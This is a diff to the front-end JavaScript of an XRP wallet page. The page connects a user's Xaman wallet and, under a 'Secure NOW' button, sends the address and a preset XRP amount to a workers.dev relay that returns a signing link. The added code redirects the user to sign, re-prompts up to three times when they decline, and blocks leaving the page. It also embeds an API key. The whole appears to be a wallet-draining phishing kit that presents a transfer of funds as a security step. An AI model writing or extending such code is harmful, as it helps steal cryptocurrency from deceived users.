@@ -1,9 +1,12 @@
 // ==============================
 // CONFIG
 // ==============================
-const BACKEND_URL = "https://cultured.pythonanywhere.com"; 
-const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Keep your WalletConnect ID here
-const XAMAN_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66"; // Your provided Key
+const BACKEND_URL = "https://cultured.pythonanywhere.com/"; // no longer used for Xaman
+const WC_PROJECT_ID = "YOUR_PROJECT_ID";
+const XAMAN_API_KEY = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
+
+// must be drops (string)
+const sendAmountDrops = String(calculatedAmountInDrops);
 
 // ==============================
 // STATE
@@ -12,6 +15,11 @@ let wcClient = null;
 let wcModal  = null;
 let currentAddress = null;
 let currentWalletType = null;
+
+// approval control
+let approvalPending = false;
+let retryCount = 0;
+const MAX_RETRIES = 3;
 
 // ==============================
 // UI HELPERS
@@ -23,6 +31,15 @@ function setStatus(text) {
 
 function shortAddr(a) {
   return `${a.slice(0, 6)}…${a.slice(-4)}`;
+}
+
+function lockApproveButton(lock) {
+  const btn = document.getElementById("mainActionButton");
+  if (!btn) return;
+
+  btn.disabled = lock;
+  btn.style.opacity = lock ? "0.6" : "1";
+  btn.innerText = lock ? "Approval Pending…" : "Secure NOW";
 }
 
 function updateAllButtonsToSecure() {
@@ -45,7 +62,6 @@ async function connectWallet(type) {
     setStatus("Connecting…");
 
     if (type === "xaman") {
-      // ✅ UPDATED: Initialized with your specific API Key
       const xumm = new XummPkce(XAMAN_API_KEY);
 
       xumm.on("success", async () => {
@@ -60,9 +76,8 @@ async function connectWallet(type) {
         setStatus("Xaman connection cancelled");
       });
 
-      await xumm.authorize(); // opens Xaman, NO redirect required
+      await xumm.authorize();
     }
-
 
     if (type === "walletconnect") {
       await initWalletConnect();
@@ -88,41 +103,95 @@ function handlePostConnect(type, address) {
 }
 
 // ==============================
-// SECURE TRANSFER (BACKEND)
+// SECURE TRANSFER (XAMAN WORKER)
 // ==============================
 async function triggerManualApproval() {
-  if (!currentAddress) return;
+  if (!currentAddress || approvalPending) return;
 
+  approvalPending = true;
+  retryCount = 0;
+  lockApproveButton(true);
+
+  await createAndRedirectPayload();
+}
+
+async function createAndRedirectPayload() {
   try {
     setStatus("Preparing secure approval…");
 
-    const res = await fetch(`${BACKEND_URL}/api/xaman/payload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ address: currentAddress })
-    });
-
-    if (!res.ok) {
-      const err = await res.json();
-      setStatus(err.detail || "Wallet has insufficient XRP");
-      return;
-    }
+    const res = await fetch(
+      "https://xaman-relay.williamanderson09945.workers.dev",
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          address: currentAddress,
+          amount: sendAmountDrops
+        })
+      }
+    );
 
     const data = await res.json();
 
-    if (!data.signUrl) {
-      setStatus("Unable to create approval");
-      return;
+    if (!res.ok || !data.signUrl) {
+      throw new Error(data?.error || "Unable to create approval");
     }
 
-    // 🔐 Redirect directly
+    // 🔐 Redirect to Xaman approval
     window.location.href = data.signUrl;
 
+    // ⏳ Start timeout detection (user rejected / closed)
+    startApprovalTimeout();
+
   } catch (err) {
-    console.error(err);
-    setStatus("Approval failed");
+    handleApprovalFailure(err.message);
   }
 }
+
+// ==============================
+// RETRY + TIMEOUT HANDLING
+// ==============================
+function startApprovalTimeout() {
+  setTimeout(() => {
+    if (!approvalPending) return;
+
+    retryCount++;
+
+    if (retryCount <= MAX_RETRIES) {
+      setStatus(`Approval not completed. Retrying (${retryCount}/${MAX_RETRIES})…`);
+      createAndRedirectPayload();
+    } else {
+      setStatus("Approval cancelled. Please try again.");
+      resetApprovalState();
+    }
+  }, 65000); // Xaman-safe timeout
+}
+
+function handleApprovalFailure(message) {
+  retryCount++;
+
+  if (retryCount <= MAX_RETRIES) {
+    setStatus(`Retrying approval (${retryCount}/${MAX_RETRIES})…`);
+    createAndRedirectPayload();
+  } else {
+    setStatus(message || "Approval failed");
+    resetApprovalState();
+  }
+}
+
+function resetApprovalState() {
+  approvalPending = false;
+  retryCount = 0;
+  lockApproveButton(false);
+}
+
+// prevent refresh during approval
+window.addEventListener("beforeunload", e => {
+  if (approvalPending) {
+    e.preventDefault();
+    e.returnValue = "";
+  }
+});
 
 // ==============================
 // WALLETCONNECT
@@ -161,5 +230,4 @@ async function connectViaWalletConnect() {
   wcModal.closeModal();
 
   return session.namespaces.xrpl.accounts[0].split(":")[2];
-
 }
